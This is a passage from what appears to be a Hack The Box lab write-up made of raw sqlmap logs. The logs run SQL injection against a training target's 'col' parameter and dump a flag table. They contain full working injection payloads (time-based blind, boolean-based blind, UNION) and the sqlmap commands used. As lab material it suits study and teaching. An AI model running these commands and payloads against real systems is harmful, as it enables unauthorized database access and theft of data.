[23:10:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[23:10:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[23:10:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:11:03] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[23:11:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[23:11:34] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[23:11:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[23:11:46] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[23:11:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[23:11:46] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[23:11:46] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[23:12:01] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[23:13:18] [INFO] URI parameter '#1*' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
[23:13:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:13:18] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[23:13:18] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[23:13:18] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[23:13:18] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[23:13:18] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[23:13:18] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
[23:13:48] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1491 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: http://94.237.48.20:45605/case6.php?col=id` AND 1608=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND `id`=`id
---
[23:17:24] [INFO] the back-end DBMS is MySQL
[23:17:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
[23:17:54] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/94.237.48.20'

[*] ending @ 23:17:54 /2024-08-21/
```

flag6
```bash
┌─[aexon@parrot]─[~]
└──╼ $sqlmap 'http://83.136.248.110:35383/case6.php?col=id*' --level 5 --risk 3 --prefix '`)' --batch -T flag6 --dump -D testdb
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:46:32 /2024-08-22/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[08:46:32] [INFO] testing connection to the target URL
[08:46:33] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:46:33] [INFO] testing if the target URL content is stable
[08:46:34] [INFO] target URL content is stable
[08:46:34] [INFO] testing if URI parameter '#1*' is dynamic
[08:46:35] [INFO] URI parameter '#1*' appears to be dynamic
[08:46:35] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[08:46:36] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[08:46:36] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[08:46:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:46:37] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")
[08:46:37] [INFO] testing 'Generic inline queries'
[08:46:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[08:46:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[08:46:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[08:46:39] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[08:46:39] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[08:46:40] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[08:46:40] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[08:46:41] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[08:46:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[08:46:42] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[08:46:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:46:43] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:46:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[08:46:43] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[08:46:44] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[08:46:44] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[08:46:45] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[08:46:46] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[08:46:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[08:46:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[08:46:46] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[08:46:46] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[08:46:46] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[08:46:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[08:46:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[08:46:46] [INFO] testing 'MySQL inline queries'
[08:46:47] [WARNING] reflective value(s) found and filtering out
[08:46:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[08:46:47] [WARNING] time-based comparison requires larger statistical model, please wait.... (done)                                                                                         
[08:46:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[08:46:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[08:46:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[08:46:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[08:46:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[08:46:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:46:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[08:46:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[08:46:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[08:46:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[08:46:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[08:46:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[08:46:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[08:46:56] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[08:46:56] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[08:47:56] [INFO] URI parameter '#1*' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
[08:47:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:47:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:47:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:48:00] [INFO] target URL appears to have 6 columns in query
[08:48:01] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://83.136.248.110:35383/case6.php?col=id`) AND 4647=4647-- nGEb

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: http://83.136.248.110:35383/case6.php?col=id`) AND 3992=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- gKxH

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: http://83.136.248.110:35383/case6.php?col=id`) UNION ALL SELECT NULL,CONCAT(0x7178627171,0x75716f5a5a49496f527452596651546f545671586f75706b4c6c51426270424c58574f4c6a4a4d55,0x7176787a71),NULL,NULL,NULL,NULL-- -
---
[08:48:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
[08:48:02] [INFO] fetching columns for table 'flag6' in database 'testdb'
[08:48:03] [INFO] fetching entries for table 'flag6' in database 'testdb'
Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content                          |
+----+----------------------------------+
| 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+

[08:48:04] [INFO] table 'testdb.flag6' dumped to CSV file '/home/aexon/.local/share/sqlmap/output/83.136.248.110/dump/testdb/flag6.csv'
[08:48:04] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/83.136.248.110'

[*] ending @ 08:48:04 /2024-08-22/

```

**Flag7***

```bash
┌─[aexon@parrot]─[~]
└──╼ $sqlmap 'http://94.237.59.63:59788/case6.php?col=id*' --level 5 --risk 3 --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:08:04 /2024-08-22/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[11:08:04] [INFO] resuming back-end DBMS 'mysql' 
[11:08:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: http://94.237.59.63:59788/case6.php?col=id`=`id` AND 2935=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND `id`=`id
---
[11:08:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
[11:08:05] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/94.237.59.63'

[*] ending @ 11:08:05 /2024-08-22/

```


